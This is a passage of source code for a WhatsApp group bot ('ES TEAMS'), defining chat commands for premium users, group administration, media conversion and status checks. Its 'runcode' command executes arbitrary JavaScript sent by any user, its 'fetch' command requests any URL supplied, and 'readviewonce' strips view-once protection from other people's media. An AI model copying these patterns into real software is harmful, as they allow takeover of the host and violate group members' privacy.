				await XliconBotInc.sendMessage(group.id, { text: 'Done' })
			}
			break
			case 'addpr': case 'addprem': case 'addpremium': {
				if (!XliconTheCreator) return XliconStickOwner()
				if (!text) return replygcxlicon(`Example:\n${prefix + command} @tag|time(s/m/h/d)`)
				let [teks1, teks2] = text.split`|`
				const nmrnya = teks1.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				const onWa = await XliconBotInc.onWhatsApp(nmrnya)
				if (!onWa.length > 0) return replygcxlicon('This number is not registered on WhatsApp!')
				if (teks2) {
					prem.addPremiumUser(nmrnya, teks2, premium);
					replygcxlicon(`Success ${command} @${nmrnya.split('@')[0]} During ${teks2}`)
					global.db.users[nmrnya].limit = global.db.users[nmrnya].vip ? global.limit.vip : global.limit.premium
					global.db.users[nmrnya].uang = global.db.users[nmrnya].vip ? global.uang.vip : global.uang.premium
				} else {
					replygcxlicon(`Enter the time!\nExample: ${prefix + command} @tag|time`)
				}
			}
			break
			case 'delpr': case 'delprem': case 'delpremium': {
				if (!XliconTheCreator) return XliconStickOwner()
				if (!text) return replygcxlicon(`Example:\n${prefix + command} @tag`)
				const nmrnya = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				if (prem.checkPremiumUser(nmrnya, premium)) {
					premium.splice(prem.getPremiumPosition(nmrnya, premium), 1);
					fs.writeFileSync('./database/premium.json', JSON.stringify(premium));
					replygcxlicon(`Sukses ${command} @${nmrnya.split('@')[0]}`)
					global.db.users[nmrnya].limit = global.db.users[nmrnya].vip ? global.limit.vip : global.limit.free
					global.db.users[nmrnya].uang = global.db.users[nmrnya].vip ? global.uang.vip : global.uang.free
				} else {
					replygcxlicon(`User @${nmrnya.split('@')[0]} Not Premium❗`)
				}
			}
			break
			case 'listpr': case 'listprem': case 'listpremium': {
				if (!XliconTheCreator) return XliconStickOwner()
				let txt = `*------「 LIST PREMIUM 」------*\n\n`
				for (let userprem of premium) {
					txt += `➸ *Number*: @${userprem.id.split('@')[0]}\n➸ *Limit*: ${global.db.users[userprem.id].limit}\n➸ *Money*: ${global.db.users[userprem.id].uang.toLocaleString('id-ID')}\n➸ *Expired*: ${formatDate(userprem.expired)}\n\n`
				}
				replygcxlicon(txt)
			}
			break
			
			// Group Menu
			case 'add': {
				if (!m.isGroup) return XliconStickGroup()
				if (!m.isAdmin) return XliconStickAdmin()
				if (!m.isBotAdmin) return XliconStickBotAdmin()
				if (!text && !m.quoted) {
					replygcxlicon(`EXAMPLE: ${prefix + command} 91xxx`)
				} else {
					const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender
					try {
						await XliconBotInc.groupParticipantsUpdate(m.chat, [numbersOnly], 'add').then(async (res) =>{
							for (let i of res) {
								let invv = await XliconBotInc.groupInviteCode(m.chat)
								if (i.status == 408) return replygcxlicon('User Just Left This Group!')
								if (i.status == 401) return replygcxlicon('User Blocked The Bot!')
								if (i.status == 409) return replygcxlicon('User has joined!')
								if (i.status == 500) return replygcxlicon('Group Full!')
								if (i.status == 403) {
									await XliconBotInc.sendMessage(m.chat, { text: `@${numbersOnly.split('@')[0]} Cannot Be Added\n\nBecause Target Private\n\nInvitations will be sent to\n-> wa.me/${numbersOnly.replace(/\D/g, '')}\nVia Private Chat`, mentions: [numbersOnly] }, { quoted : m })
									await XliconBotInc.sendMessage(`${numbersOnly ? numbersOnly : '916909137213@s.whatsapp.net'}`, { text: `${'https://chat.whatsapp.com/' + invv}\n------------------------------------------------------\n\nAdmin: wa.me/${m.sender}\nInvite you to this group\nPlease enter if you wish🙇`, detectLink: true, mentions: [numbersOnly] }, { quoted : floc2 }).catch((err) => replygcxlicon('Failed to Send Invitation!'))
								} else {
									replygcxlicon('Success!!')
								}
							}
						})
					} catch (e) {
						replygcxlicon('Failed to Add User')
					}
				}
			}
			break
			case 'kick': {
    if (!m.isGroup) return XliconStickGroup();
    if (!m.isAdmin) return XliconStickAdmin();
    if (!m.isBotAdmin) return XliconStickBotAdmin();

    if (!text && !m.quoted) {
        return replygcxlicon(`Example: ${prefix + command} 91xxx`);
    } else {
        const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender;
        await XliconBotInc.groupParticipantsUpdate(m.chat, [numbersOnly], 'remove')
            .then(() => {
                XliconBotInc.sendMessage(m.chat, {
                    text: '*𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐇𝐀𝐒 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐊𝐈𝐂𝐊𝐄𝐃 𝐓𝐇𝐄 𝐔𝐒𝐄𝐑*',
                });
            })
            .catch((err) => {
                replygcxlicon('Failed to Kick User!');
            });
    }
}
break;
			case 'promote': {
				if (!m.isGroup) return XliconStickGroup()
				if (!m.isAdmin) return XliconStickAdmin()
				if (!m.isBotAdmin) return XliconStickBotAdmin()
				if (!text && !m.quoted) {
					replygcxlicon(`Example: ${prefix + command} 91xxx`)
				} else {
					const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender
					await XliconBotInc.groupParticipantsUpdate(m.chat, [numbersOnly], 'promote').catch((err) => replygcxlicon('Fail!'))
					replygcxlicon(mess.done)
				}
			}
			break
			case 'demote': {
				if (!m.isGroup) return XliconStickGroup()
				if (!m.isAdmin) return XliconStickAdmin()
				if (!m.isBotAdmin) return XliconStickBotAdmin()
				if (!text && !m.quoted) {
					replygcxlicon(`Example: ${prefix + command} 91xxx`)
				} else {
					const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender
					await XliconBotInc.groupParticipantsUpdate(m.chat, [numbersOnly], 'demote').catch((err) => replygcxlicon('Failed!'))
					replygcxlicon(mess.done)
				}
			}
			break
			case 'setnamegc': case 'setsubject': case 'setname': case 'setnamegc': case 'setsubject': case 'setsubjectgc': {
				if (!m.isGroup) return XliconStickGroup()
				if (!m.isAdmin) return XliconStickAdmin()
				if (!m.isBotAdmin) return XliconStickBotAdmin()
				if (!text && !m.quoted) {
					replygcxlicon(`Example: ${prefix + command} text`)
				} else {
					const teksnya = text ? text : m.quoted.text
					await XliconBotInc.groupUpdateSubject(m.chat, teksnya).catch((err) => replygcxlicon('Fail!'))
				}
			}
			break
			case 'setdesc': case 'setdescgc': case 'setdesk': case 'setdeskgc': {
				if (!m.isGroup) return XliconStickGroup()
				if (!m.isAdmin) return XliconStickAdmin()
				if (!m.isBotAdmin) return XliconStickBotAdmin()
				if (!text && !m.quoted) {
					replygcxlicon(`Example: ${prefix + command} textnya`)
				} else {
					const teksnya = text ? text : m.quoted.text
					await XliconBotInc.groupUpdateDescription(m.chat, teksnya).catch((err) => replygcxlicon('Fail!'))
				}
			}
			break
			case 'setppgroup':
            case 'setppgrup':
            case 'setppgc':
            case 'setgrouppp':
            case 'setgruppp':
            case 'setgcpp':
                if (!m.isGroup) return XliconStickGroup()
                if (!m.isAdmin) return replygcxlicon(mess.admin)
                if (!m.isBotAdmin) return XliconStickBotAdmin()
                if (!quoted) return replygcxlicon(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replygcxlicon(`Send/Reply Image Caption Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replygcxlicon(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await XliconBotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await XliconBotInc.query({
                        tag: 'iq',
                        attrs: {
                            to: m.chat,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replygcxlicon(mess.done)
                } else {
                    var memeg = await XliconBotInc.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygcxlicon(mess.done)
                }
                break
		case 'delete': case 'del': case 'd': {
    if (!m.quoted) {
        return replygcxlicon('Reply to the message you want to delete');
    }
    
    await XliconBotInc.sendMessage(m.chat, {
        delete: {
            remoteJid: m.chat,
            fromMe: m.isBotAdmin ? false : true,
            id: m.quoted.id,
            participant: m.quoted.sender
        }
    });

    // Send custom response after deleting the message
    return replygcxlicon(' `𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐇𝐀𝐒 𝐃𝐄𝐋𝐄𝐓𝐄𝐃 𝐓𝐇𝐄 𝐌𝐄𝐒𝐒𝐀𝐆𝐄`');
}
break;

case 'menu': {
    if (!XliconTheCreator) return XliconStickOwner();
    return replygcxlicon(' `𝐓𝐲𝐩𝐞 [.𝐞𝐬𝐭𝐞𝐚𝐦𝐬] 𝐭𝐨 𝐀𝐜𝐭𝐢𝐯𝐚𝐭𝐞 𝐭𝐡𝐞 𝐌𝐞𝐧𝐮`')
}
break

			case 'linkgroup': case 'linkgrup': case 'linkgc': case 'urlgroup': case 'urlgrup': case 'urlgc': {
				if (!m.isGroup) return XliconStickGroup()
				if (!m.isAdmin) return XliconStickAdmin()
				if (!m.isBotAdmin) return XliconStickBotAdmin()
				let response = await XliconBotInc.groupInviteCode(m.chat)
				await XliconBotInc.sendMessage(m.chat, { text: `https://chat.whatsapp.com/${response}\n\nLink Group : ${(await XliconBotInc.groupMetadata(m.chat)).subject}`, detectLink: true }, { quoted: m });
			}
			break
			case 'resetlink': case 'revoke': case 'newlink': case 'newurl': {
				if (!m.isGroup) return XliconStickGroup()
				if (!m.isAdmin) return XliconStickAdmin()
				if (!m.isBotAdmin) return XliconStickBotAdmin()
				await XliconBotInc.groupRevokeInvite(m.chat).then((a) => {
					replygcxlicon(`Reset Success, Group Invite Link ${m.metadata.subject}`)
				}).catch((err) => replygcxlicon('Fail!'))
			}
			break
			case 'group': case 'grup': {
				if (!m.isGroup) return XliconStickGroup()
				if (!m.isAdmin) return XliconStickAdmin()
				if (!m.isBotAdmin) return XliconStickBotAdmin()
				if (text === 'close') {
					await XliconBotInc.groupSettingUpdate(m.chat, 'announcement').then((res) => replygcxlicon(`*Successfully Closing The Group*`))
				} else if (text === 'open') {
					await XliconBotInc.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replygcxlicon(`*Successfully Opening The Group*`))
				} else {
					let button = [{
						name: 'single_select',
						buttonParamsJson: {
							title: 'SELECT',
							sections: [{
								title: 'Group Mode',
								rows: [
									{ title: 'Open Group', description: 'Open Group', id: 'grup open' },
									{ title: 'Close Group', description: 'Close Group', id: 'grup close' },
								]
							}]
						}
					}]
					await XliconBotInc.sendButtonMsg(m.chat, 'Group Mode', xliconytimewisher, 'Please choose', null, button, m);
				}
			}
			break
			case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
if (!m.isGroup) return XliconStickGroup()
if (!m.isAdmin && !XliconTheCreator) return XliconStickAdmin()
if (!m.isBotAdmin) return XliconStickBotAdmin()
    await XliconBotInc.removeProfilePicture(m.chat)
    }
    break
    case 'deleteppbot': case 'delbotpp': case 'delppbot': {
if (!XliconTheCreator) return XliconStickOwner()
    await XliconBotInc.removeProfilePicture(XliconBotInc.user.id)
    replygcxlicon(`Success in deleting bot's profile picture`)
    }
    break
			case 'antidelete': {
    if (!m.isGroup) return XliconStickGroup();
    if (!m.isAdmin) return XliconStickAdmin();
    if (!m.isBotAdmin) return XliconStickBotAdmin();
    if (text === 'on') {
        if (db.groups[m.chat].antidelete) return replygcxlicon('*Anti Delete is already active!*');
        db.groups[m.chat].antidelete = true;
        replygcxlicon('*Anti Delete Activated!*');
    } else if (text === 'off') {
        db.groups[m.chat].antidelete = false;
        replygcxlicon('*Anti Delete Disabled!*');
    } else {
        return replygcxlicon(`
            Please choose an option to enable or disable Anti-Delete.

            Usage:
            - ${prefix + command} on  : Enable Anti-Delete
            - ${prefix + command} off : Disable Anti-Delete

            Example: ${prefix + command} on
        `);
    }
}
break;

			case 'tagall': {
				if (!m.isGroup) return XliconStickGroup()
				if (!m.isAdmin) return XliconStickAdmin()
				if (!m.isBotAdmin) return XliconStickBotAdmin()
				let teks = `*Tag All*\n\n*Message :* ${q ? q : ''}\n\n`
				for (let mem of m.metadata.participants) {
					teks += `${setv} @${mem.id.split('@')[0]}\n`
				}
				await XliconBotInc.sendMessage(m.chat, { text: teks, mentions: m.metadata.participants.map(a => a.id) }, { quoted: m })
			}
			break
			case 'hidetag': case 'h': {
				if (!m.isGroup) return XliconStickGroup()
          if (!XliconTheCreator) return XliconStickAdmin()
				XliconBotInc.sendMessage(m.chat, { text : q ? q : '' , mentions: m.metadata.participants.map(a => a.id)}, { quoted: m })
			}
			break
			case 'totag': {
				if (!m.isGroup) return XliconStickGroup()
				if (!m.isAdmin) return XliconStickAdmin()
				if (!m.isBotAdmin) return XliconStickBotAdmin()
				if (!m.quoted) return replygcxlicon(`Reply messages with captions ${prefix + command}`)
				delete m.quoted.chat
				await XliconBotInc.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: m.metadata.participants.map(a => a.id) })
			}
			break
			case 'listonline': case 'liston': {
				if (!m.isGroup) return XliconStickGroup()
				let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
				let online = [...Object.keys(store.presences[id]), botNumber]
				await XliconBotInc.sendMessage(m.chat, { text: 'List Online:\n\n' + online.map(v => `${setv} @` + v.replace(/@.+/, '')).join`\n`, mentions: online }, { quoted: m }).catch((e) => replygcxlicon('Fail'))
			}
			break
			
			// Bot Menu
			case 'owner': {
				let list = []
for (let i of owner) {
list.push({
	    	displayName: await XliconBotInc.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await XliconBotInc.getName(i)}\nFN:${await XliconBotInc.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
                XliconBotInc.sendMessage(m.chat, {
                    contacts: {
                        displayName: `${list.length} Contact`,
                        contacts: list
                    }, contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                }, {
                    quoted: m
                })
            }
            break
			case 'profile': case 'cekme': case 'cek': {
				const user = Object.keys(global.db.users)
				const infoUser = global.db.users[m.sender]
				const teks = `*Profile @${m.sender.split('@')[0]}* :\nUser Bot : ${user.includes(m.sender) ? 'True' : 'False'}\nUser : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}\nLimit : ${infoUser.limit}\nMoney : ${infoUser ? infoUser.uang.toLocaleString('id-ID') : '0'}`
				await XliconBotInc.sendTextMentions(m.chat, teks, m)
			}
			break
			case 'req': case 'request': {
				if (!text) return replygcxlicon('What do you want to request from the owner??')
				await XliconBotInc.sendMessage(m.chat, { text: `*Request Has Been Sent To Owner*\n_Thank You🙏_` }, { quoted: m })
				await XliconBotInc.sendFromOwner(ownernumber, `Order From : @${m.sender.split('@')[0]}\nFor Owners\n\nRequest ${text}`, m, { contextInfo: { mentionedJid: [m.sender], isForwarded: true }})
			}
			break
			case 'daily': case 'claim': {
				daily(XliconBotInc, m, global.db.users)
			}
			break
			case 'transferlimit': case 'tflimit': case 'tlimit': {
				transferLimit(XliconBotInc, m, args, global.db.users)
			}
			break
			case 'transfermoney': case 'tmoney': case 'transfer': {
				transferUang(XliconBotInc, m, args, global.db.users)
			}
			break
			case 'buy': {
				buy(m, args, db)
			}
			break
			case 'react': {
				XliconBotInc.sendMessage(m.chat, { react: { text: args[0], key: m.quoted ? m.quoted.key : m.key }})
			}
			break
			case 'tagme': {
				XliconBotInc.sendMessage(m.chat, { text: `@${m.sender.split('@')[0]}`, mentions: [m.sender] }, { quoted: m })
			}
			break
                
case 'runcode': {
    if (!text) return replygcxlicon(`Example: ${prefix + command} <JavaScript code>`);

    try {
        // Variable to capture console output
        let consoleOutput = '';
        const customConsole = {
            log: (...args) => {
                consoleOutput += args.join(' ') + '\n'; // Capture console.log output
            }
        };

        // Wrap the code execution in a Function and pass in the custom console
        const codeFunction = new Function('console', text);
        let result = codeFunction(customConsole); // Execute the code

        // If the result is a Promise (async code), await it
        if (result instanceof Promise) {
            result = await result;
        }

        // Prepare the output message
        const output = consoleOutput ? `\n🖥️ *Console Output:*\n\`\`\`${consoleOutput}\`\`\`` : '';
        const resultMessage = result !== undefined ? `\n✅ *Execution Result:*\n\`\`\`${result}\`\`\`` : '';

        replygcxlicon(`${resultMessage}${output || ''}`);
    } catch (error) {
        // Return an error message if execution fails
        replygcxlicon(`❌ *Error:* \n\`\`\`${error.message}\`\`\``);
    }
}
break;

                
            case 'p': case 'ping': case 'botstatus': case 'statusbot': {
    let timestamp = speed();
    let latensi = speed() - timestamp;
    neww = performance.now();
    oldd = performance.now();

    const respon = `
✨ *Bot Response Status* ✨\n
📡 *Response Speed*: \n ${latensi.toFixed(4)} _seconds_
🕒 *Ping*: \n ${oldd - neww} _milliseconds_
⏱ *Runtime*: \n ${runtime(process.uptime())}
🗄 *RAM Usage*: \n ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
\n🎉 *Keeping the bot in top shape!*
`.trim();

    replygcxlicon(respon);
}
break;
    
			
			case 'p2': case 'ping2': case 'botstatus2': case 'statusbot2': {
    const used = process.memoryUsage();
    const cpus = os.cpus().map(cpu => {
        cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0);
        return cpu;
    });
    
    const cpu = cpus.reduce((last, cpu, _, { length }) => {
        last.total += cpu.total;
        last.speed += cpu.speed / length;
        last.times.user += cpu.times.user;
        last.times.nice += cpu.times.nice;
        last.times.sys += cpu.times.sys;
        last.times.idle += cpu.times.idle;
        last.times.irq += cpu.times.irq;
        return last;
    }, {
        speed: 0,
        total: 0,
        times: {
            user: 0,
            nice: 0,
            sys: 0,
            idle: 0,
            irq: 0
        }
    });
    
    let timestamp = speed();
    let latensi = speed() - timestamp;
    neww = performance.now();
    oldd = performance.now();

    respon = `
📡 *Response Speed*: ${latensi.toFixed(4)} _seconds_
🕒 ${oldd - neww} _milliseconds_
⏱ *Runtime*: ${runtime(process.uptime())}

💻 *Server Info*
🗄 *RAM Usage*: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

🛠 *NodeJS Memory Usage*
${Object.keys(used)
    .map(
        (key, _, arr) =>
            `${key.padEnd(Math.max(...arr.map(v => v.length)), ' ')}: ${formatp(used[key])}`
    )
    .join('\n')}

${cpus[0] ? `🖥️ *Total CPU Usage*
${cpus[0].model.trim()} (${cpu.speed} MHz)
${Object.keys(cpu.times)
    .map(
        type =>
            `- ${type.padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`
    )
    .join('\n')}

*CPU Core(s) Usage* (${cpus.length} Core CPU)
${cpus
    .map(
        (cpu, i) =>
            `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHz)\n${Object.keys(cpu.times)
                .map(
                    type =>
                        `- ${type.padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`
                )
                .join('\n')}`
    )
    .join('\n\n')}` : ''}`.trim();

    replygcxlicon(respon);
}
break;



case 'speedtest':
case 'speed': {
    replygcxlicon('⚡ Testing Speed... ⚡');
    let cp = require('child_process');
    let { promisify } = require('util');
    let exec = promisify(cp.exec).bind(cp);
    let o;
    
    try {
        o = await exec('python3 speed.py');
    } catch (e) {
        o = e;
    } finally {
        let { stdout, stderr } = o;
        if (stdout.trim()) replygcxlicon(`🌟 Speed Test Results 🌟\n\n${stdout}`);
        if (stderr.trim()) replygcxlicon(`⚠️ Error:\n${stderr}`);
    }
}
break;
			case 'afk': {
				let user = global.db.users[m.sender]
				user.afkTime = + new Date
				user.afkReason = text
				replygcxlicon(`@${m.sender.split('@')[0]} Been Afk ${text ? ': ' + text : ''}`)
			}
			break
        
case 'readviewonce': 
case 'vv': 
case 'readviewone': 
case 'rvo': {
    try {
        if (!m.quoted) {
            return replygcxlicon(`Reply to a view once message\nExample: ${prefix + command}`);
        }

        const reply = (message) => XliconBotInc.sendMessage(m.chat, { text: message }, { quoted: m });
        let status = 'Premium'; 
        let limitMessage = ''; 

        // Check for Premium access
        if (!(await checkApprovedNumber(m.sender, reply))) {
            const freeUserLimits = global.freeUserLimits || (global.freeUserLimits = {}); 
            const dailyLimit = 10;
            const today = new Date().toLocaleDateString(); 
            const userLimits = freeUserLimits[m.sender] || (freeUserLimits[m.sender] = {});

            if (!userLimits[today]) userLimits[today] = 0; 
            const remainingLimit = dailyLimit - userLimits[today];

            if (remainingLimit <= 0) {
                return replygcxlicon('`𝐃𝐀𝐈𝐋𝐘 𝐋𝐈𝐌𝐈𝐓 𝐄𝐗𝐂𝐄𝐄𝐃𝐄𝐃`\n\n𝐆𝐞𝐭 𝐩𝐫𝐞𝐦𝐢𝐮𝐦 𝐟𝐨𝐫 𝐮𝐧𝐥𝐢𝐦𝐢𝐭𝐞𝐝 𝐚𝐜𝐜𝐞𝐬𝐬.');
            }

            userLimits[today]++;
            global.freeUserLimits[m.sender] = userLimits;
            status = 'Free';
            limitMessage = `📊 *Limit:* _${remainingLimit - 1} / ${dailyLimit}_`;
        }

        // Send view-once message to private inbox
        const userInbox = `${m.sender.split('@')[0]}@s.whatsapp.net`; 
        if (m.quoted.msg.viewOnce) {
            m.quoted.msg.viewOnce = false; 
            await XliconBotInc.sendMessage(userInbox, { forward: m.quoted }, { quoted: m });
        } else if (m.quoted.msg.message && m.quoted.msg.message.audioMessage && m.quoted.msg.message.audioMessage.viewOnce) {
            m.quoted.msg.message.audioMessage.viewOnce = false;
            await XliconBotInc.sendMessage(userInbox, { forward: m.quoted }, { quoted: m });
        } else {
            return replygcxlicon(`Reply to a view once message\nExample: ${prefix + command}`);
        }

        // Reply with a structured message
        const displayMessage = `\`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏 𝐑𝐄𝐀𝐃 𝐕𝐈𝐄𝐖 𝐌𝐄𝐒𝐒𝐀𝐆𝐄\`\n\n` +
            `📤 *Status:* _${status}_\n` +
            `${limitMessage}\n\n` +
            `📥 *Your view-once message has been sent to your private inbox.*\n\n` +
            `\`𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐓𝐄𝐂𝐇\``;

        replygcxlicon(displayMessage);
    } catch (error) {
        console.error('Error in readviewonce command:', error);
        replygcxlicon('⚠️ An error occurred. Please try again.');
    }
}
break;

			case 'inspect': {
				if (!text) return replygcxlicon('Enter Group Link!')
				let code = q.match(/chat.whatsapp.com\/([\w\d]*)/g);
				if (code === null) return replygcxlicon('No invite url detected.');
				code = code[0].replace('chat.whatsapp.com/', '');
				await XliconBotInc.groupGetInviteInfo(code).then(anu => {
					let { id, subject, owner, subjectOwner, creation, desc, descId, participants, size, descOwner } = anu
					console.log(anu);
					let par = `*Gc Name* : ${subject}\n*ID* : ${id}\n${owner ? `*Creator* : @${owner.split('@')[0]}` : '*Creator* : -'}\n*Number of Members* : ${size}\n*Gc Created Date* : ${new Date(creation * 1000).toLocaleString()}\n*DescID* : ${descId ? descId : '-'}\n${subjectOwner ? `*GC Name Changed By* : @${subjectOwner.split('@')[0]}` : '*GC Name Changed By* : -'}\n${descOwner ? `*Desc changed by* : @${descOwner.split('@')[0]}` : '*Desc changed by* : -'}\n\n*Desc* : ${desc ? desc : '-'}\n`;
					XliconBotInc.sendTextMentions(m.chat, par, m);
				}).catch((res) => {
					if (res.data == 406) return replygcxlicon('Group Not Found❗');
					if (res.data == 410) return replygcxlicon('Group URL Has Been Reset❗');
				});
			}
			break
                
                
			case 'q': case 'quoted': {
				if (!m.quoted) return replygcxlicon('Reply the message!')
				const anu = await m.getQuotedObj()
				if (!anu) return replygcxlicon('Format Not Available!')
				if (!anu.quoted) return replygcxlicon('The Message You Reply Does Not Contain a Reply')
				await XliconBotInc.relayMessage(m.chat, { [anu.quoted.type]: anu.quoted.msg }, {})
			}
			break
                
                
			case 'confes': case 'confess': case 'menfes': case 'menfess': {
				if (m.isGroup) return XliconStickPrivate();
				if (game.menfes[m.sender]) return replygcxlicon(`You're In Session ${command}!`)
				if (!text) return replygcxlicon(`Example : ${prefix + command} 91xxxx|Fake name`)
				let [teks1, teks2] = text.split`|`
				if (!isNaN(teks1) && !teks1.startsWith('0') && teks1) {
					const tujuan = teks1.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
					const onWa = await XliconBotInc.onWhatsApp(tujuan)
					if (!onWa.length > 0) return replygcxlicon('This number is not registered on WhatsApp!')
					game.menfes[m.sender] = {
						tujuan: tujuan,
						nama: teks2,
						waktu: setTimeout(() => {
							if (game.menfes[m.sender]) replygcxlicon(`_Time ${command} finished_`)
							delete game.menfes[m.sender];
						}, 600000)
					};
					game.menfes[tujuan] = {
						tujuan: m.sender,
						nama: 'Recipient',
						waktu: setTimeout(() => {
							if (game.menfes[tujuan]) XliconBotInc.sendMessage(tujuan, { text: `_Time ${command} finished_` });
							delete game.menfes[tujuan];
						}, 600000)
					};
					XliconBotInc.sendMessage(tujuan, { text: `_${command} connected_\n*Note :* if you want to end, type _*${prefix}del${command}*_` });
					replygcxlicon(`_Start ${command}..._\n*Please start sending messages/media*\n*Duration ${command} only for 10 minutes*\n*Note :* if you want to end, type _*${prefix}del${command}*_`)
				} else {
					replygcxlicon(`Enter the number!\nExample : ${prefix + command} 234xxxx|Fake name`)
				}
			}
			break
                
			case 'delconfes': case 'delconfess': case 'delmenfes': case 'delmenfess': {
				if (!game.menfes[m.sender]) return replygcxlicon(`You Are Not In ${command.split('del')[1]} session!`)
				let anu = game.menfes[m.sender]
				XliconBotInc.sendMessage(anu.tujuan, { text: `Chat Ended By ${anu.nama ? anu.nama : 'Somebody'}` })
				replygcxlicon(`Successfully Ends Session ${command.split('del')[1]}!`)
				delete game.menfes[anu.tujuan];
				delete game.menfes[m.sender];
			}
			break
			
			// Tools Menu
			case 'fetch': case 'get': {
				if (!text.startsWith('http')) return replygcxlicon(`No Query?\n\nExample : ${prefix + command} https://google.com`)
				try {
					const res = await axios.get(isUrl(text) ? isUrl(text)[0] : text)
					if (!/json|html|plain/.test(res.headers['content-type'])) {
						await replygcxlicon(text)
					} else {
						replygcxlicon(util.format(res.data))
					}
				} catch (e) {
					replygcxlicon(util.format(e))
				}
			}
			break
                
			case 'toaud': case 'toaudio': {
				if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxlicon(`Send/Reply Video/Audio that you want to make into audio with captions ${prefix + command}`)
				XliconStickWait()
				let media = await (m.quoted ? m.quoted.download() : m.download())
				let audio = await toAudio(media, 'mp4')
				await XliconBotInc.sendMessage(m.chat, { audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
			}
			break
                
			case 'tomp3': {
				if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxlicon(`Send/Reply Video/Audio that you want to make into audio with captions ${prefix + command}`)
				XliconStickWait()
				let media = await (m.quoted ? m.quoted.download() : m.download())
				let audio = await toAudio(media, 'mp4')
				await XliconBotInc.sendMessage(m.chat, { document: audio, mimetype: 'audio/mpeg', fileName: `𝐄𝐒-𝐓𝐄𝐀𝐌𝐒.mp3`}, { quoted : m })
			}
			break
                
			case 'tovn': case 'toptt': case 'tovoice': {
				if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxlicon(`Send/Reply Video/Audio that you want to make into audio with captions ${prefix + command}`)
				XliconStickWait()
				let media = await (m.quoted ? m.quoted.download() : m.download())
				let audio = await toPTT(media, 'mp4')
				await XliconBotInc.sendMessage(m.chat, { audio: audio, mimetype: 'audio/ogg; codecs=opus', ptt: true }, { quoted: m })
			}
			break
                
			case 'togif': {
				if (!/webp/.test(mime) && !/video/.test(mime)) return replygcxlicon(`Reply Video/Sticker with caption *${prefix + command}*`)
				XliconStickWait()
				let { webp2mp4File } = require('./lib/uploader')
				let media = await XliconBotInc.downloadAndSaveMediaMessage(qmsg)
				let webpToMp4 = await webp2mp4File(media)
				await XliconBotInc.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
				await fs.unlinkSync(media)
			}
			break
                
			case 'tovideo': case 'tomp4': {
				if (!/webp/.test(mime) && !/video/.test(mime)) return replygcxlicon(`Reply Video/Sticker with caption *${prefix + command}*`)
				XliconStickWait()
				let { webp2mp4File } = require('./lib/uploader')
				let media = await XliconBotInc.downloadAndSaveMediaMessage(qmsg)
				let webpToMp4 = await webp2mp4File(media)
				await XliconBotInc.sendMessage(m.chat, { video: { url: webpToMp4.result }, caption: 'Convert Webp To Video' }, { quoted: m })
				await fs.unlinkSync(media)
			}
			break
                
			case 'toimage': case 'toimg': {
				if (!/webp/.test(mime)) return replygcxlicon(`Reply Video/Sticker with caption *${prefix + command}*`)
				XliconStickWait()
				let media = await XliconBotInc.downloadAndSaveMediaMessage(qmsg)
				let ran = await getRandom('.png')
				exec(`ffmpeg -i ${media} ${ran}`, (err) => {
					fs.unlinkSync(media)
					if (err) return replygcxlicon('Fail❗')
					let buffer = fs.readFileSync(ran)
					XliconBotInc.sendMessage(m.chat, { image: buffer }, { quoted: m })
					fs.unlinkSync(ran)
				})
			}
			break
                
			case 'toptv': {
				if (!/video/.test(mime)) return replygcxlicon(`Send/Reply the video you want to use as a PTV message with caption ${prefix + command}`)
